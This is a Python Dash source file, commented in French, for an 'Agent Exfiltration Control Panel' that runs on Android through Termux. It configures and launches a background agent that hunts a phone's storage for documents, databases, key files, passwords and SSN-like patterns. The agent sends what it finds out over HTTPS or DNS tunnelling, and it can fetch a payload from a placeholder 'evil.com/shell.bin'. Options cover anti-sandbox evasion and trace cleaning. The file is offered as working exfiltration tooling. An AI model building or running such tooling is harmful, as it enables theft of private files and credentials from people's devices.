import dash
from dash import dcc, html
from dash.dependencies import Input, Output, State
import subprocess
import shlex
import os
import time
import json
import sys
import base64
import signal # Pour arrêter l'agent si besoin

# --- Configuration des Chemins (maintenant relatifs au répertoire de l'agent) ---
# AGENT_DIR est maintenant le répertoire courant où ce script se trouve
AGENT_DIR = os.path.dirname(os.path.abspath(__file__))
AGENT_PATH = os.path.join(AGENT_DIR, 'exf_agent.py')
LOG_FILE_PATH = os.path.join(AGENT_DIR, 'agent_logs.enc')
SHARED_CONFIG_FILE = os.path.join(AGENT_DIR, 'shared_config.json')

# --- Globals pour l'état du processus de l'agent ---
running_agent_process = None
agent_output_buffer = []

# --- Fonctions utilitaires ---
def generate_aes_key(length: int = 32) -> str:
    """Génère une clé AES aléatoire de la longueur spécifiée (en bytes) et l'encode en Base64."""
    return base64.urlsafe_b64encode(os.urandom(length)).decode('utf-8').rstrip('=')

def load_shared_config():
    """Charge la configuration depuis le fichier JSON partagé."""
    config_data = {}
    if os.path.exists(SHARED_CONFIG_FILE):
        try:
            with open(SHARED_CONFIG_FILE, 'r') as f:
                config_data = json.load(f)
            print(f"[INFO] Fichier de configuration partagé '{SHARED_CONFIG_FILE}' chargé.")
        except json.JSONDecodeError:
            print(f"[ERREUR] Le fichier '{SHARED_CONFIG_FILE}' est corrompu. Recréation forcée lors de la première sauvegarde.")
            # On ne lève pas d'erreur ici, on laisse la fonction en dessous la recréer si nécessaire
        except Exception as e:
            print(f"[ERREUR] Erreur lors du chargement de la config partagée '{SHARED_CONFIG_FILE}': {e}")
    return config_data

def save_shared_config(config_data: dict):
    """Sauvegarde la configuration dans le fichier JSON partagé."""
    try:
        with open(SHARED_CONFIG_FILE, 'w') as f:
            json.dump(config_data, f, indent=4)
        print(f"[INFO] Configuration sauvegardée dans '{SHARED_CONFIG_FILE}'.")
    except Exception as e:
        print(f"[ERREUR] Impossible de sauvegarder la configuration dans '{SHARED_CONFIG_FILE}': {e}")

# --- Charger/Générer la configuration au démarrage de l'application Dash ---
shared_config_data = load_shared_config()

# Si le fichier de configuration n'existe pas ou est vide/corrompu, on le génère avec des valeurs par défaut
if not shared_config_data or 'aes_key' not in shared_config_data:
    print("[INFO] Génération d'une nouvelle configuration partagée (clé AES et valeurs par défaut).")
    shared_config_data = {
        "aes_key": generate_aes_key(),
        "default_target_url": "https://webhook.site/VOTRE_URL_UNIQUE_ICI", # REMPLACER MANUELLEMENT
        "default_scan_path": os.path.expanduser('~') + "/storage/shared", # Chemin par défaut Termux
        "default_file_types": ".doc,.docx,.txt,.pdf,.xls,.xlsx,.csv,.db,.sqlite,.json,.xml,.key,.pem,.pptx,.log,.md",
        "default_exclude_types": ".exe,.dll,.sys,.bin,.tmp,.py,.sh,.bak,.old",
        "default_min_size": "1k",
        "default_max_size": "100M",
        "default_dns_server": "8.8.8.8",
        "default_dns_domain": "exfil.yourdomain.com", # Exemple, à changer
        "default_keywords": "",
        "default_regex_patterns": "",
        "default_payload_url": "",
        "default_payload_path": "",
        "default_threads": 4,
        "default_debug_mode": True,
        "default_no_clean": True,
        "default_no_anti_evasion": False,
    }
    save_shared_config(shared_config_data)
    print(f"[ATTENTION] Veuillez remplacer l'URL 'https://webhook.site/VOTRE_URL_UNIQUE_ICI' dans le fichier '{SHARED_CONFIG_FILE}' par votre URL webhook.site via l'interface ou manuellement !")

# --- Valeurs par défaut de l'UI (utilisées dans le layout) ---
DEFAULT_AES_KEY = shared_config_data.get('aes_key', '')
DEFAULT_TARGET_URL = shared_config_data.get('default_target_url', '')
DEFAULT_SCAN_PATH = shared_config_data.get('default_scan_path', os.path.expanduser('~'))
DEFAULT_FILE_TYPES = shared_config_data.get('default_file_types', '')
DEFAULT_EXCLUDE_TYPES = shared_config_data.get('default_exclude_types', '')
DEFAULT_MIN_SIZE = shared_config_data.get('default_min_size', '1k')
DEFAULT_MAX_SIZE = shared_config_data.get('default_max_size', '100M')
DEFAULT_DNS_SERVER = shared_config_data.get('default_dns_server', '8.8.8.8')
DEFAULT_DNS_DOMAIN = shared_config_data.get('default_dns_domain', '')
DEFAULT_KEYWORDS = shared_config_data.get('default_keywords', '')
DEFAULT_REGEX_PATTERNS = shared_config_data.get('default_regex_patterns', '')
DEFAULT_PAYLOAD_URL = shared_config_data.get('default_payload_url', '')
DEFAULT_PAYLOAD_PATH = shared_config_data.get('default_payload_path', '')
DEFAULT_THREADS = shared_config_data.get('default_threads', 4)
DEFAULT_DEBUG_MODE = ['debug'] if shared_config_data.get('default_debug_mode', True) else []
DEFAULT_NO_CLEAN = ['no-clean'] if shared_config_data.get('default_no_clean', True) else []
DEFAULT_NO_ANTI_EVASION = ['no-anti-evasion'] if shared_config_data.get('default_no_anti_evasion', False) else []

# --- Initialisation de l'application Dash (DÉPLACÉ ICI) ---
app = dash.Dash(__name__, title="Agent Exfiltration Control Panel")


# --- Pour la lecture des logs chiffrés ---
# L'importation des modules de l'agent se fait maintenant plus simplement
# car control_panel.py est dans le même répertoire que 'modules'.
AgentLogger = None
AES256Cipher = None
log_cipher_instance = None
can_decrypt_logs = False

try:
    from modules.aes256 import AES256Cipher
    from modules.logger import Logger as AgentLogger 
    
    if DEFAULT_AES_KEY:
        try:
            log_cipher_instance = AES256Cipher(DEFAULT_AES_KEY)
            can_decrypt_logs = True
        except Exception as e:
            print(f"[ERREUR] Impossible d'initialiser le chiffreur de logs avec la clé par défaut: {e}. Les logs chiffrés ne pourront pas être lus.")
    else:
        print("[AVERTISSEMENT] Pas de clé AES par défaut pour le déchiffrement des logs. Veuillez l'entrer manuellement.")

except ImportError as e:
    print(f"[CRITIQUE] IMPORTER LES MODULES DE L'AGENT ÉCHOUÉ : {e}. Assurez-vous que les dépendances sont installées.")
    print("[CRITIQUE] Les logs chiffrés NE POURRONT PAS être lus via cette interface.")
except Exception as e:
    print(f"[CRITIQUE] Erreur inattendue lors de l'importation/initialisation des modules de déchiffrement: {e}. Les logs chiffrés ne pourront pas être lus.")


# --- Styles CSS pour un thème sombre et stylé (le même que précédemment) ---
DARK_THEME_STYLE = {
    'backgroundColor': '#21252B',
    'color': '#ABB2BF',
    'fontFamily': 'monospace',
    'padding': '25px',
    'borderRadius': '8px',
    'boxShadow': '0 4px 8px rgba(0,0,0,0.4)'
}

HEADER_STYLE = {
    'textAlign': 'center',
    'color': '#61AFEF',
    'marginBottom': '25px',
    'textShadow': '2px 2px 4px rgba(0,0,0,0.6)'
}

SECTION_HEADER_STYLE = {
    'color': '#C678DD',
    'borderBottom': '1px solid #3B4048',
    'paddingBottom': '10px',
    'marginBottom': '20px'
}

INPUT_STYLE = {
    'width': '98%',
    'padding': '12px',
    'marginTop': '8px',
    'marginBottom': '15px',
    'backgroundColor': '#282C34',
    'border': '1px solid #61AFEF',
    'borderRadius': '5px',
    'color': '#ABB2BF',
    'boxSizing': 'border-box'
}

BUTTON_STYLE = {
    'backgroundColor': '#98C379',
    'color': '#282c34',
    'marginTop': '25px',
    'padding': '12px 25px',
    'border': 'none',
    'borderRadius': '5px',
    'cursor': 'pointer',
    'fontSize': '1.1em',
    'fontWeight': 'bold',
    'boxShadow': '3px 3px 6px rgba(0,0,0,0.3)',
    'transition': 'background-color 0.3s ease'
}

STATUS_BOX_STYLE = {
    'backgroundColor': '#1E2127',
    'padding': '15px',
    'borderRadius': '5px',
    'overflowX': 'auto',
    'whiteSpace': 'pre-wrap',
    'wordWrap': 'break-word',
    'color': '#E06C75',
    'border': '1px solid #61AFEF',
    'minHeight': '150px',
    'maxHeight': '400px',
    'overflowY': 'auto'
}

# --- Layout de l'application Dash ---
app.layout = html.Div(style=DARK_THEME_STYLE, children=[
    html.H1("Agent Exfiltration Control Panel", style=HEADER_STYLE),
    html.Div([
        html.H2("Configuration de l'Agent", style=SECTION_HEADER_STYLE),
        html.Div("Cible d'Exfiltration (URL ou IP:Port) *:", style={'marginTop': '10px'}),
        dcc.Input(id='target-url', type='text', value=DEFAULT_TARGET_URL, style=INPUT_STYLE, required=True),

        html.Div("Chemin à Scanner *:", style={'marginTop': '10px'}),
        dcc.Input(id='scan-path', type='text', value=DEFAULT_SCAN_PATH, style=INPUT_STYLE, required=True),

        html.Div("Clé AES (32 bytes) *:", style={'marginTop': '10px'}),
        dcc.Input(id='aes-key', type='text', value=DEFAULT_AES_KEY, style=INPUT_STYLE, required=True),

        html.Div("Méthode d'Exfiltration *:", style={'marginTop': '10px'}),
        dcc.Dropdown(
            id='exfil-method',
            options=[
                {'label': 'HTTPS (Recommandé)', 'value': 'https'},
                {'label': 'DNS (Furtif, nécessite un serveur DNS contrôlé)', 'value': 'dns'}
            ],
            value='https',
            style={**INPUT_STYLE, 'color': '#ABB2BF', 'padding': '0', 'height': 'auto', 'width': '100%'},
            clearable=False
        ),
        
        html.Div(id='dns-options-div', children=[
            html.Div("Serveur DNS (IP) *:", style={'marginTop': '10px'}),
            dcc.Input(id='dns-server', type='text', placeholder='Ex: 8.8.8.8 (Google DNS)', value=DEFAULT_DNS_SERVER, style=INPUT_STYLE),
            html.Div("Domaine DNS *:", style={'marginTop': '10px'}),
            dcc.Input(id='dns-domain', type='text', placeholder='Ex: exfil.yourdomain.com', value=DEFAULT_DNS_DOMAIN, style=INPUT_STYLE),
        ], style={'display': 'none'}),

        html.H2("Options de Filtrage", style=SECTION_HEADER_STYLE),
        html.Div("Types de Fichiers à Inclure (Ex: .doc,.txt,.pdf):", style={'marginTop': '10px'}),
        dcc.Input(id='file-types', type='text', value=DEFAULT_FILE_TYPES, style=INPUT_STYLE),

        html.Div("Types de Fichiers à Exclure (Ex: .exe,.dll):", style={'marginTop': '10px'}),
        dcc.Input(id='exclude-types', type='text', value=DEFAULT_EXCLUDE_TYPES, style=INPUT_STYLE),

        html.Div("Taille Minimale (Ex: 5k, 1M, 1G):", style={'marginTop': '10px'}),
        dcc.Input(id='min-size', type='text', value=DEFAULT_MIN_SIZE, style=INPUT_STYLE),

        html.Div("Taille Maximale (Ex: 10M, 1G):", style={'marginTop': '10px'}),
        dcc.Input(id='max-size', type='text', value=DEFAULT_MAX_SIZE, style=INPUT_STYLE),

        html.Div("Mots-clés dans le Contenu (Ex: secret,password):", style={'marginTop': '10px'}),
        dcc.Input(id='keywords', type='text', placeholder='Séparés par des virgules', value=DEFAULT_KEYWORDS, style=INPUT_STYLE),

        html.Div("Motifs Regex dans le Contenu (Ex: (\\d{3}-\\d{2}-\\d{4})):", style={'marginTop': '10px'}), # Corrigé \d en \d
        dcc.Input(id='regex-patterns', type='text', placeholder='Séparés par des virgules', value=DEFAULT_REGEX_PATTERNS, style=INPUT_STYLE),

        html.H2("Options Avancées et Furtivité", style=SECTION_HEADER_STYLE),
        html.Div("URL du Payload (Optionnel):", style={'marginTop': '10px'}),
        dcc.Input(id='payload-url', type='text', placeholder='Ex: http://evil.com/shell.bin', value=DEFAULT_PAYLOAD_URL, style=INPUT_STYLE),

        html.Div("Chemin de Destination du Payload (Optionnel):", style={'marginTop': '10px'}),
        dcc.Input(id='payload-path', type='text', placeholder='Ex: /data/local/tmp/payload_binary', value=DEFAULT_PAYLOAD_PATH, style=INPUT_STYLE),

        html.Div("Nombre de Threads (pour scan et upload):", style={'marginTop': '10px'}),
        dcc.Input(id='threads', type='number', value=DEFAULT_THREADS, style=INPUT_STYLE),

        html.Div([
            dcc.Checklist(
                id='debug-mode',
                options=[{'label': ' Activer le mode Debug (logs verbeux, pas de nettoyage)', 'value': 'debug'}],
                value=DEFAULT_DEBUG_MODE,
                style={'color': '#E5C07B', 'marginTop': '10px'}
            ),
            dcc.Checklist(
                id='no-clean',
                options=[{'label': ' Ne pas nettoyer les traces après exécution', 'value': 'no-clean'}],
                value=DEFAULT_NO_CLEAN,
                style={'color': '#E5C07B', 'marginTop': '10px'}
            ),
            dcc.Checklist(
                id='no-anti-evasion',
                options=[{'label': ' Désactiver les contrôles anti-évasion (anti-debug/sandbox)', 'value': 'no-anti-evasion'}],
                value=DEFAULT_NO_ANTI_EVASION, 
                style={'color': '#E5C07B', 'marginTop': '10px'}
            ),
        ]),
        
        html.Button('Sauvegarder la Configuration', id='save-config-button', n_clicks=0, style={**BUTTON_STYLE, 'backgroundColor': '#C678DD', 'marginRight': '10px'}),
        html.Button('Lancer l\'Agent', id='launch-button', n_clicks=0, style={**BUTTON_STYLE, 'backgroundColor': '#98C379'}),
        html.Button('Arrêter l\'Agent', id='stop-button', n_clicks=0, style={**BUTTON_STYLE, 'backgroundColor': '#E06C75', 'marginLeft': '10px'}),
        
        html.Hr(style={'borderColor': '#4B525F', 'marginTop': '30px', 'marginBottom': '30px'}),
        
        html.H2("Statut de l'Agent et Logs", style=SECTION_HEADER_STYLE),
        html.Pre(id='command-output', style=STATUS_BOX_STYLE, children="Cliquez sur 'Lancer l\'Agent' pour voir la sortie..."),
        
        html.Button('Rafraîchir les Logs (chiffrés localement)', id='refresh-logs-button', n_clicks=0, style={**BUTTON_STYLE, 'backgroundColor': '#56B6C2', 'marginRight': '10px', 'marginTop': '20px'}),
        html.Button('Télécharger les Logs Bruts (chiffrés)', id='download-logs-button', n_clicks=0, style={**BUTTON_STYLE, 'backgroundColor': '#C678DD', 'marginTop': '20px'}),
        dcc.Download(id="download-logs-data"),
        html.Pre(id='decrypted-logs-output', style={**STATUS_BOX_STYLE, 'color': '#98C379', 'marginTop': '20px'}, children="Logs déchiffrés (si disponible)..."),

    ], style={'maxWidth': '800px', 'margin': 'auto'}),
])

# Callback pour afficher/masquer les options DNS
@app.callback(
    Output('dns-options-div', 'style'),
    Input('exfil-method', 'value')
)
def toggle_dns_options(method):
    if method == 'dns':
        return {'display': 'block'}
    return {'display': 'none'}

# Callback pour sauvegarder la configuration par défaut
@app.callback(
    Output('save-config-button', 'children'),
    Input('save-config-button', 'n_clicks'),
    State('target-url', 'value'),
    State('scan-path', 'value'),
    State('aes-key', 'value'),
    State('exfil-method', 'value'),
    State('dns-server', 'value'),
    State('dns-domain', 'value'),
    State('file-types', 'value'),
    State('exclude-types', 'value'),
    State('min-size', 'value'),
    State('max-size', 'value'),
    State('keywords', 'value'),
    State('regex-patterns', 'value'),
    State('payload-url', 'value'),
    State('payload-path', 'value'),
    State('threads', 'value'),
    State('debug-mode', 'value'),
    State('no-clean', 'value'),
    State('no-anti-evasion', 'value')
)
def save_config(n_clicks, target_url, scan_path, aes_key, exfil_method, dns_server, dns_domain, 
                file_types, exclude_types, min_size, max_size, keywords, regex_patterns,
                payload_url, payload_path, threads, debug_mode_val, no_clean_val, no_anti_evasion_val):
    if n_clicks == 0:
        return "Sauvegarder la Configuration"

    config_to_save = {
        "aes_key": aes_key,
        "default_target_url": target_url,
        "default_scan_path": scan_path,
        "default_file_types": file_types,
        "default_exclude_types": exclude_types,
        "default_min_size": min_size,
        "default_max_size": max_size,
        "default_dns_server": dns_server,
        "default_dns_domain": dns_domain,
        "default_keywords": keywords,
        "default_regex_patterns": regex_patterns,
        "default_payload_url": payload_url,
        "default_payload_path": payload_path,
        "default_threads": threads,
        "default_debug_mode": 'debug' in debug_mode_val,
        "default_no_clean": 'no-clean' in no_clean_val,
        "default_no_anti_evasion": 'no-anti-evasion' in no_anti_evasion_val,
    }
    save_shared_config(config_to_save)
    return "Configuration sauvegardée !"

# Callback pour lancer l'agent
@app.callback(
    Output('command-output', 'children'),
    Input('launch-button', 'n_clicks'),
    State('target-url', 'value'),
    State('scan-path', 'value'),
    State('aes-key', 'value'),
    State('exfil-method', 'value'),
    State('dns-server', 'value'),
    State('dns-domain', 'value'),
    State('file-types', 'value'),
    State('exclude-types', 'value'),
    State('min-size', 'value'),
    State('max-size', 'value'),
    State('keywords', 'value'),
    State('regex-patterns', 'value'),
    State('payload-url', 'value'),
    State('payload-path', 'value'),
    State('threads', 'value'),
    State('debug-mode', 'value'),
    State('no-clean', 'value'),
    State('no-anti-evasion', 'value')
)
def launch_agent(n_clicks, target_url, scan_path, aes_key, exfil_method, dns_server, dns_domain, 
                 file_types, exclude_types, min_size, max_size, keywords, regex_patterns,
                 payload_url, payload_path, threads, debug_mode_val, no_clean_val, no_anti_evasion_val):
    global running_agent_process, agent_output_buffer
    
    if n_clicks == 0:
        return "Cliquez sur 'Lancer l\'Agent' pour commencer."

    if running_agent_process and running_agent_process.poll() is None:
        return "Erreur: L'agent est déjà en cours d'exécution. Arrêtez-le d'abord si vous voulez lancer une nouvelle instance."

    if not target_url or not aes_key:
        return "Erreur: L'URL cible et la clé AES sont obligatoires."
    if exfil_method == 'dns' and (not dns_server or not dns_domain):
        return "Erreur: Serveur DNS et Domaine DNS sont obligatoires pour l'exfiltration DNS."

    command = [sys.executable, AGENT_PATH]
    command.extend(["--target", target_url])
    command.extend(["--scan", scan_path])
    command.extend(["--key", aes_key])
    command.extend(["--method", exfil_method])

    if exfil_method == 'dns':
        command.extend(["--dns-server", dns_server])
        command.extend(["--dns-domain", dns_domain])
    
    if file_types:
        command.extend(["--types", file_types])
    if exclude_types:
        command.extend(["--exclude-types", exclude_types])
    if min_size:
        command.extend(["--min-size", str(min_size)])
    if max_size:
        command.extend(["--max-size", str(max_size)])
    if keywords:
        command.extend(["--keywords", keywords])
    if regex_patterns:
        command.extend(["--regex-patterns", regex_patterns])

    if payload_url:
        command.extend(["--payload-url", payload_url])
    if payload_path:
        command.extend(["--payload-path", payload_path])
    
    if threads:
        command.extend(["--threads", str(threads)])

    if 'debug' in debug_mode_val:
        command.append("--debug")
    if 'no-clean' in no_clean_val:
        command.append("--no-clean")
    if 'no-anti-evasion' in no_anti_evasion_val:
        command.append("--no-anti-evasion")

    full_command_str = shlex.join(command)
    agent_output_buffer = [f"Lancement de la commande:\n{full_command_str}\n", "--- Agent Démarré (voir logs pour plus de détails) ---"]

    try:
        running_agent_process = subprocess.Popen(command, 
                                                 stdout=subprocess.DEVNULL,
                                                 stderr=subprocess.DEVNULL,
                                                 cwd=AGENT_DIR, 
                                                 preexec_fn=os.setsid
                                                 )
        
        agent_output_buffer.append(f"\n[INFO] Agent lancé avec PID: {running_agent_process.pid}")
        agent_output_buffer.append("[INFO] L'agent s'exécute en arrière-plan.")
        agent_output_buffer.append("[INFO] Utilisez le bouton 'Rafraîchir les Logs' ci-dessous pour suivre son activité.")

        return html.Pre("\n".join(agent_output_buffer), style=STATUS_BOX_STYLE)

    except FileNotFoundError:
        return f"Erreur: Le script agent '{AGENT_PATH}' n'a pas été trouvé. Assurez-vous du chemin."
    except Exception as e:
        return f"Erreur lors du lancement de l'agent: {e}"

# Callback pour arrêter l'agent
@app.callback(
    Output('stop-button', 'children'),
    Input('stop-button', 'n_clicks')
)
def stop_agent(n_clicks):
    global running_agent_process
    if n_clicks == 0:
        return "Arrêter l'Agent"

    if running_agent_process and running_agent_process.poll() is None:
        try:
            os.killpg(os.getpgid(running_agent_process.pid), signal.SIGINT)
            
            time.sleep(2)
            if running_agent_process.poll() is None:
                running_agent_process.terminate()
                time.sleep(1)
            if running_agent_process.poll() is None:
                running_agent_process.kill()
            
            running_agent_process = None
            return "Agent arrêté avec succès."
        except ProcessLookupError:
            running_agent_process = None
            return "Agent déjà arrêté ou introuvable."
        except Exception as e:
            return f"Erreur lors de l'arrêt de l'agent: {e}"
    else:
        return "Aucun agent en cours d'exécution."

# Callback pour rafraîchir et déchiffrer les logs
@app.callback(
    Output('decrypted-logs-output', 'children'),
    Input('refresh-logs-button', 'n_clicks'),
    State('aes-key', 'value')
)
def refresh_decrypted_logs(n_clicks, aes_key_for_decrypt):
    if n_clicks == 0:
        return "Logs déchiffrés (si disponible)..."
    
    # Vérifier si AgentLogger et AES256Cipher ont été importés avec succès au démarrage du panneau
    if AgentLogger is None or AES256Cipher is None:
        return "Fonction de déchiffrement des logs non disponible (modules de l'agent non importés ou erreurs)."

    temp_log_cipher = None
    if aes_key_for_decrypt:
        try:
            temp_log_cipher = AES256Cipher(aes_key_for_decrypt)
        except Exception:
            return "Erreur: Clé AES invalide pour le déchiffrement des logs. Veuillez vérifier la clé."
    else:
        return "Veuillez fournir la clé AES dans le champ ci-dessus pour déchiffrer les logs."

    if not temp_log_cipher:
        return "Impossible d'initialiser le déchiffreur de logs avec la clé fournie."

    try:
        temp_logger = AgentLogger(LOG_FILE_PATH, aes_key_for_decrypt, debug_mode=True)
        temp_logger.cipher = temp_log_cipher
        logs = temp_logger.read_and_decrypt_logs()
        
        if not logs:
            return "Aucun log trouvé ou logs illisibles/non déchiffrables. L'agent a-t-il déjà tourné ?"

        formatted_logs = []
        for entry in logs:
            formatted_logs.append(f"[{entry.get('timestamp', 'N/A')}] {entry.get('level', 'N/A')}: {entry.get('message', 'N/A')}")
        
        return html.Pre("\n".join(formatted_logs), style={**STATUS_BOX_STYLE, 'color': '#98C379'})

    except Exception as e:
        return f"Erreur lors du rafraîchissement/déchiffrement des logs: {e}. La clé AES est-elle correcte ou le fichier de log est-il corrompu ?"

# Callback pour le téléchargement des logs bruts (chiffrés)
@app.callback(
    Output("download-logs-data", "data"),
    Input("download-logs-button", "n_clicks"),
    prevent_initial_call=True
)
def download_logs(n_clicks):
    if os.path.exists(LOG_FILE_PATH):
        try:
            with open(LOG_FILE_PATH, "rb") as f:
                content = f.read()
            return dcc.send_bytes(content, "agent_logs_encrypted.enc")
        except Exception as e:
            return f"Erreur lors de la lecture du fichier de logs pour le téléchargement: {e}"
    return None


if __name__ == '__main__':
    print("\n[--- INSTRUCTIONS DE LANCEMENT DU PANNEAU DE CONTRÔLE ---]")
    print("[+] 1. Assurez-vous d'avoir Python, pip et Dash installés dans Termux.")
    print(f"[+] 2. Ce script est maintenant dans le dossier de l'agent: {AGENT_DIR}")
    print("[+] 3. Exécutez ce panneau de contrôle depuis le répertoire de l'agent :")
    print(f"   cd {AGENT_DIR} && nohup python -u control_panel.py > control_panel.log 2>&1 &")
    print("\n[+] Accédez ensuite à l'interface dans votre navigateur Android sur : http://127.0.0.1:8050")
    print("[+] Gardez ce terminal Termux ouvert pendant que l'interface est active.")

    try:
        app.run(host='0.0.0.0', debug=True, port=8050)
    except Exception as e:
        print(f"Erreur lors du lancement du serveur Dash: {e}")
        print("Vérifiez si le port est déjà utilisé ou si Dash est correctement installé.")

